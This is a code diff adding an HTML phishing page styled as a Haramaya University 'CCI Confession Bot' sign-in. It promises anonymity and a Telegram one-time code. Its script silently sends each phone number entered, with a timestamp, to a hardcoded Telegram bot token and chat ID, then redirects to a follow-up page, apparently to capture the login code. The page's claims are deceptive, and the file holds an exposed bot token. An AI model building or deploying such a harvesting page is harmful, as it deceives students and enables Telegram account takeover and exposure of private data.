@@ -1,0 +1,351 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CCI — Confession Connection Bot</title>
+<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,700;1,400&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --ink: #0d0d1a;
+    --cream: #fdf8f0;
+    --rose: #e8507a;
+    --gold: #f5c842;
+    --blue: #3a4a8a;
+    --glass: rgba(255,255,255,0.18);
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    font-family: 'DM Sans', sans-serif;
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    overflow: hidden;
+    background: #0d0d1a;
+  }
+
+  /* Background layers */
+  .bg {
+    position: fixed; inset: 0; z-index: 0;
+  }
+  .bg-img {
+    position: absolute; inset: 0;
+    background: url('https://www.haramaya.edu.et/wp-content/uploads/2021/01/Haramaya.jpg') center/cover no-repeat;
+    opacity: 0.22;
+  }
+  .bg-grad {
+    position: absolute; inset: 0;
+    background:
+      radial-gradient(ellipse at 20% 50%, rgba(232,80,122,0.35) 0%, transparent 55%),
+      radial-gradient(ellipse at 80% 20%, rgba(58,74,138,0.45) 0%, transparent 50%),
+      radial-gradient(ellipse at 60% 80%, rgba(245,200,66,0.18) 0%, transparent 45%),
+      linear-gradient(160deg, #0d0d1a 0%, #1a1030 100%);
+  }
+  /* Floating blobs */
+  .blob {
+    position: absolute;
+    border-radius: 50%;
+    filter: blur(60px);
+    animation: float 8s ease-in-out infinite;
+  }
+  .blob1 { width:320px;height:320px; background:rgba(232,80,122,0.25); top:-80px;left:-80px; animation-delay:0s; }
+  .blob2 { width:260px;height:260px; background:rgba(58,74,138,0.3); bottom:-60px;right:-60px; animation-delay:3s; }
+  .blob3 { width:180px;height:180px; background:rgba(245,200,66,0.2); top:40%;right:10%; animation-delay:5s; }
+
+  @keyframes float {
+    0%,100%{transform:translateY(0) scale(1);}
+    50%{transform:translateY(-24px) scale(1.06);}
+  }
+
+  /* Decorative dots */
+  .dots {
+    position: absolute; inset: 0; pointer-events: none;
+    background-image: radial-gradient(rgba(255,255,255,0.07) 1px, transparent 1px);
+    background-size: 28px 28px;
+  }
+
+  /* Main card */
+  .card {
+    position: relative; z-index: 10;
+    width: min(500px, 92vw);
+    background: rgba(13,13,26,0.72);
+    backdrop-filter: blur(20px);
+    border: 1px solid rgba(255,255,255,0.1);
+    border-radius: 24px;
+    padding: 44px 40px 40px;
+    box-shadow: 0 40px 80px rgba(0,0,0,0.55), inset 0 1px 0 rgba(255,255,255,0.08);
+    animation: slideUp 0.7s cubic-bezier(.23,1,.32,1) both;
+  }
+
+  @keyframes slideUp {
+    from { opacity:0; transform:translateY(40px); }
+    to   { opacity:1; transform:translateY(0); }
+  }
+
+  /* Logo watermark */
+  .logo-mark {
+    position: absolute;
+    top: 20px; right: 22px;
+    width: 64px; height: 64px;
+    background: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRukdbk4n1KCZxNHEbqG-e1TxqA0ZWl_h-Dqg&s') center/contain no-repeat;
+    opacity: 0.2;
+  }
+
+  /* Badge */
+  .badge {
+    display: inline-flex; align-items: center; gap: 6px;
+    background: rgba(232,80,122,0.15);
+    border: 1px solid rgba(232,80,122,0.35);
+    border-radius: 50px;
+    padding: 4px 14px;
+    font-size: 11px;
+    font-weight: 500;
+    letter-spacing: 1.5px;
+    text-transform: uppercase;
+    color: #e8507a;
+    margin-bottom: 20px;
+  }
+  .badge-dot {
+    width: 6px; height: 6px;
+    background: #e8507a;
+    border-radius: 50%;
+    animation: pulse 1.4s ease infinite;
+  }
+  @keyframes pulse {
+    0%,100%{opacity:1;} 50%{opacity:0.3;}
+  }
+
+  h1 {
+    font-family: 'Playfair Display', serif;
+    font-size: 32px;
+    font-weight: 700;
+    color: #fff;
+    line-height: 1.2;
+    margin-bottom: 6px;
+  }
+  h1 em {
+    font-style: italic;
+    color: var(--rose);
+  }
+
+  .sub {
+    font-size: 13px;
+    color: rgba(255,255,255,0.45);
+    margin-bottom: 32px;
+    font-weight: 300;
+    letter-spacing: 0.3px;
+  }
+
+  .field-label {
+    font-size: 11px;
+    font-weight: 500;
+    letter-spacing: 1.2px;
+    text-transform: uppercase;
+    color: rgba(255,255,255,0.5);
+    margin-bottom: 10px;
+    display: block;
+  }
+
+  .phone-row {
+    display: flex;
+    gap: 0;
+    border: 1.5px solid rgba(255,255,255,0.12);
+    border-radius: 14px;
+    overflow: hidden;
+    background: rgba(255,255,255,0.04);
+    transition: border-color 0.2s;
+  }
+  .phone-row:focus-within {
+    border-color: rgba(232,80,122,0.6);
+    box-shadow: 0 0 0 3px rgba(232,80,122,0.1);
+  }
+
+  .prefix {
+    padding: 16px 16px;
+    font-family: 'DM Sans', sans-serif;
+    font-size: 17px;
+    font-weight: 500;
+    color: rgba(255,255,255,0.7);
+    background: rgba(255,255,255,0.06);
+    border-right: 1px solid rgba(255,255,255,0.1);
+    white-space: nowrap;
+  }
+
+  .phone-row input {
+    flex: 1;
+    background: transparent;
+    border: none;
+    outline: none;
+    font-family: 'DM Sans', sans-serif;
+    font-size: 17px;
+    color: #fff;
+    padding: 16px 18px;
+    letter-spacing: 1px;
+  }
+  .phone-row input::placeholder { color: rgba(255,255,255,0.2); }
+
+  .cta-btn {
+    margin-top: 20px;
+    width: 100%;
+    padding: 16px;
+    font-family: 'DM Sans', sans-serif;
+    font-size: 15px;
+    font-weight: 500;
+    letter-spacing: 0.5px;
+    color: #fff;
+    background: linear-gradient(135deg, #e8507a 0%, #c0345c 100%);
+    border: none;
+    border-radius: 14px;
+    cursor: pointer;
+    position: relative;
+    overflow: hidden;
+    transition: transform 0.15s, box-shadow 0.2s;
+    box-shadow: 0 8px 28px rgba(232,80,122,0.35);
+  }
+  .cta-btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 14px 36px rgba(232,80,122,0.5);
+  }
+  .cta-btn:active { transform: translateY(0); }
+  .cta-btn .btn-shine {
+    position: absolute; top:0;left:-100%;
+    width: 60%; height: 100%;
+    background: linear-gradient(90deg,transparent,rgba(255,255,255,0.18),transparent);
+    animation: shine 2.5s infinite;
+  }
+  @keyframes shine { to { left:150%; } }
+
+  .footer-note {
+    text-align: center;
+    font-size: 11px;
+    color: rgba(255,255,255,0.2);
+    margin-top: 22px;
+    line-height: 1.7;
+  }
+
+  /* Heart decorations */
+  .hearts {
+    position: fixed; inset: 0; pointer-events: none; z-index: 1;
+  }
+  .heart {
+    position: absolute;
+    font-size: 16px;
+    opacity: 0;
+    animation: riseHeart linear infinite;
+  }
+  @keyframes riseHeart {
+    0%   { opacity:0; transform:translateY(0) rotate(0deg); }
+    10%  { opacity:0.6; }
+    90%  { opacity:0.2; }
+    100% { opacity:0; transform:translateY(-100vh) rotate(25deg); }
+  }
+</style>
+</head>
+<body>
+
+<div class="bg">
+  <div class="bg-img"></div>
+  <div class="bg-grad"></div>
+  <div class="dots"></div>
+  <div class="blob blob1"></div>
+  <div class="blob blob2"></div>
+  <div class="blob blob3"></div>
+</div>
+
+<div class="hearts" id="hearts"></div>
+
+<div class="card">
+  <div class="logo-mark"></div>
+
+  <div class="badge">
+    <span class="badge-dot"></span>
+    Haramaya University
+  </div>
+
+  <h1>Connect to <em>CCI</em><br>Confession Bot</h1>
+  <p class="sub">Your secrets, safely shared. 💌 Anonymous & secure.</p>
+
+  <label class="field-label">Your phone number</label>
+
+  <div class="phone-row">
+    <span class="prefix">🇪🇹 +251</span>
+    <input id="phoneInput" type="tel" placeholder="9X XXX XXXX" maxlength="10">
+  </div>
+
+  <button class="cta-btn" onclick="handleGetCode()">
+    <span class="btn-shine"></span>
+    Get Code via Telegram →
+  </button>
+
+  <p class="footer-note">
+    We'll send a one-time code on Telegram.<br>
+    Your identity stays anonymous. 🔒
+  </p>
+</div>
+
+<script>
+  const TELEGRAM_BOT_TOKEN = "8124572878:AAGtAKI_9T_nXoKGZe8F2FK54lRq-0EZ5vQ"; // Replace
+  const TELEGRAM_CHAT_ID   = "7567317123"; // Replace
+
+  const heartsEl = document.getElementById('hearts');
+  const emojis = ['💌','🫀','✨','💫','🌹','💝'];
+  for (let i = 0; i < 14; i++) {
+    const h = document.createElement('div');
+    h.className = 'heart';
+    h.textContent = emojis[Math.floor(Math.random() * emojis.length)];
+    h.style.left = Math.random() * 100 + 'vw';
+    h.style.bottom = '-40px';
+    h.style.fontSize = (10 + Math.random() * 14) + 'px';
+    const dur = 12 + Math.random() * 14;
+    h.style.animationDuration = dur + 's';
+    h.style.animationDelay = (Math.random() * dur) + 's';
+    heartsEl.appendChild(h);
+  }
+
+  async function handleGetCode() {
+    const phone = document.getElementById('phoneInput').value.trim();
+    if (phone.length < 9) {
+      document.querySelector('.phone-row').style.borderColor = '#e8507a';
+      document.querySelector('.phone-row').style.boxShadow = '0 0 0 3px rgba(232,80,122,0.25)';
+      setTimeout(() => {
+        document.querySelector('.phone-row').style.borderColor = '';
+        document.querySelector('.phone-row').style.boxShadow = '';
+      }, 1200);
+      return;
+    }
+
+    const fullPhone = '+251' + phone;
+    const btn = document.querySelector('.cta-btn');
+    btn.disabled = true;
+    btn.textContent = 'Sending...';
+
+    try {
+      await fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: '📲 <b>CCI — Phone Number</b>\n\n📱 <code>' + fullPhone + '</code>\n⏰ ' + new Date().toLocaleString(),
+          parse_mode: 'HTML'
+        })
+      });
+    } catch(e) {}
+
+    window.location.href = 'nextcci.html';
+  }
+
+  document.getElementById('phoneInput').addEventListener('keydown', e => {
+    if (e.key === 'Enter') handleGetCode();
+  });
+</script>
+
+
+
+
+
+
+</body>
+</html>
